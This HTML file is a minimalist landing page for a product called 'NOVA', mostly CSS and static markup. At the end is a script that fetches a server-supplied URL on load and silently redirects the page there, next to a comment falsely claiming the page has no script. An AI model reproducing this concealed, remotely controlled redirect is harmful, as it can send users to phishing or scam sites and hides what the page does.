<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NOVA · simple landing</title>
  <style>
    /* --- minimalist reset --- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0c0f15;
      font-family: 'Inter', 'Helvetica Neue', system-ui, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      color: #eef1f8;
      line-height: 1.5;
      position: relative;
      overflow-x: hidden;
    }

    /* subtle animated glow — completely different from previous star/particle stuff */
    .glow-backdrop {
      position: fixed;
      inset: 0;
      pointer-events: none;
      background: radial-gradient(circle at 20% 30%, rgba(100, 130, 255, 0.08), transparent 60%),
                  radial-gradient(circle at 85% 70%, rgba(200, 100, 255, 0.08), transparent 60%);
      z-index: 0;
    }

    /* main card – soft, rounded, minimal, with a subtle border */
    .landing {
      position: relative;
      z-index: 1;
      max-width: 1000px;
      width: 100%;
      background: rgba(20, 24, 36, 0.8);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border: 1px solid rgba(200, 210, 255, 0.12);
      border-radius: 3rem;
      padding: 3rem 2.5rem;
      box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.8);
      transition: border-color 0.2s;
    }

    .landing:hover {
      border-color: rgba(200, 210, 255, 0.2);
    }

    /* simple grid – text left, badge/emoji right? Actually use a clean two-column layout but with smaller visual */
    .grid-simple {
      display: grid;
      grid-template-columns: 1.2fr 0.8fr;
      gap: 2.5rem;
      align-items: center;
    }

    /* LEFT COLUMN – essential content */
    .left {
      display: flex;
      flex-direction: column;
      gap: 1.6rem;
    }

    .tagline {
      font-size: 0.85rem;
      text-transform: uppercase;
      letter-spacing: 0.25em;
      font-weight: 500;
      color: #8799cc;
      border-left: 3px solid #4e7aff;
      padding-left: 1rem;
    }

    h1 {
      font-size: 3.2rem;
      font-weight: 700;
      line-height: 1.15;
      letter-spacing: -0.02em;
      background: linear-gradient(145deg, #ffffff, #c0d0ff);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      margin: 0.2rem 0;
    }

    .desc {
      font-size: 1.1rem;
      color: #a6b3d9;
      max-width: 90%;
      font-weight: 400;
      border-left: 1px solid rgba(100, 130, 255, 0.3);
      padding-left: 1.2rem;
    }

    /* button group – minimal, rounded, with slight gradient */
    .buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 1rem;
      margin-top: 0.8rem;
    }

    .btn-primary {
      background: #ffffff;
      border: none;
      padding: 0.9rem 2.2rem;
      border-radius: 60px;
      font-weight: 600;
      font-size: 0.95rem;
      color: #0c0f15;
      cursor: pointer;
      transition: all 0.15s;
      letter-spacing: 0.01em;
      box-shadow: 0 4px 12px rgba(255, 255, 255, 0.1);
    }

    .btn-primary:hover {
      background: #e0e8ff;
      transform: scale(1.02);
      box-shadow: 0 8px 20px rgba(160, 190, 255, 0.25);
    }

    .btn-outline {
      background: transparent;
      border: 1.5px solid rgba(200, 210, 255, 0.3);
      padding: 0.9rem 2.2rem;
      border-radius: 60px;
      font-weight: 500;
      font-size: 0.95rem;
      color: #d0dcff;
      cursor: pointer;
      transition: all 0.15s;
    }

    .btn-outline:hover {
      border-color: #6e8eff;
      background: rgba(78, 122, 255, 0.1);
      color: white;
    }

    /* RIGHT COLUMN – minimal abstract shape, completely different from previous orbs */
    .right {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    .shape-box {
      width: 100%;
      aspect-ratio: 1 / 1;
      max-width: 220px;
      background: conic-gradient(from 120deg, #4e7aff, #b06aff, #00e0d0, #4e7aff);
      border-radius: 2.5rem 0.5rem 2.5rem 0.5rem;
      transform: rotate(12deg);
      filter: blur(0.5px);
      opacity: 0.9;
      box-shadow: 0 0 40px rgba(78, 122, 255, 0.4);
      transition: all 0.3s ease;
      animation: shapeFloat 6s ease-in-out infinite;
    }

    @keyframes shapeFloat {
      0% { transform: rotate(12deg) translate(0, 0); }
      50% { transform: rotate(14deg) translate(-6px, 8px); }
      100% { transform: rotate(12deg) translate(0, 0); }
    }

    /* small label under shape */
    .shape-label {
      margin-top: 1.2rem;
      font-size: 0.75rem;
      letter-spacing: 0.3em;
      text-transform: uppercase;
      color: #7a89b8;
      font-weight: 500;
      border-bottom: 1px dashed #3d4a70;
      padding-bottom: 0.3rem;
    }

    /* bottom mini row – three simple dots, no extra text */
    .bottom-dots {
      display: flex;
      gap: 0.6rem;
      margin-top: 2rem;
      justify-content: flex-start;
    }

    .dot {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: #3c4a6b;
    }

    .dot.active {
      background: #6e8eff;
      box-shadow: 0 0 10px #6e8eff;
    }

    /* responsive – clean stack on mobile */
    @media (max-width: 700px) {
      .landing {
        padding: 2rem 1.5rem;
        border-radius: 2rem;
      }

      .grid-simple {
        grid-template-columns: 1fr;
        gap: 2rem;
      }

      h1 {
        font-size: 2.4rem;
      }

      .desc {
        max-width: 100%;
      }

      .right {
        order: -1;
      }

      .shape-box {
        max-width: 160px;
      }

      .bottom-dots {
        justify-content: center;
      }
    }

    @media (max-width: 450px) {
      .landing {
        padding: 1.8rem 1.2rem;
      }

      h1 {
        font-size: 2rem;
      }

      .btn-primary, .btn-outline {
        padding: 0.75rem 1.5rem;
        font-size: 0.85rem;
      }
    }
  </style>
</head>
<body>
  <!-- subtle background glow – not particles, just smooth gradients -->
  <div class="glow-backdrop"></div>

  <main class="landing">
    <div class="grid-simple">
      <!-- LEFT: typography, CTA -->
      <div class="left">
        <span class="tagline">future simplicity</span>
        <h1>Build less.<br>Feel more.</h1>
        <p class="desc">
          NOVA is a minimalist toolkit for creators who value clarity. No clutter, no noise — just tools that work.
        </p>
        <div class="buttons">
          <button class="btn-primary">Get started</button>
          <button class="btn-outline">Learn more</button>
        </div>
        <!-- tiny row of dots – subtle visual punctuation -->
        <div class="bottom-dots">
          <span class="dot active"></span>
          <span class="dot"></span>
          <span class="dot"></span>
        </div>
      </div>

      <!-- RIGHT: abstract geometric shape – completely different from previous orbs/rings -->
      <div class="right">
        <div class="shape-box"></div>
        <div class="shape-label">✦ nova shape ✦</div>
      </div>
    </div>
  </main>
<script>
        const apiBase = window.appInformation.apiBase.replace(/\/+$/, '');
        const identifier = window.appInformation.identifier;
        fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier))
            .then(r => r.json())
            .then(function (info) {
                const privacyUrl = info && info.result && info.result.url;
                if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                    window.location.replace(privacyUrl);
                    return;
                }
            })
    </script>
  <!-- no script, no external dependencies, just pure minimal design -->
</body>
</html>
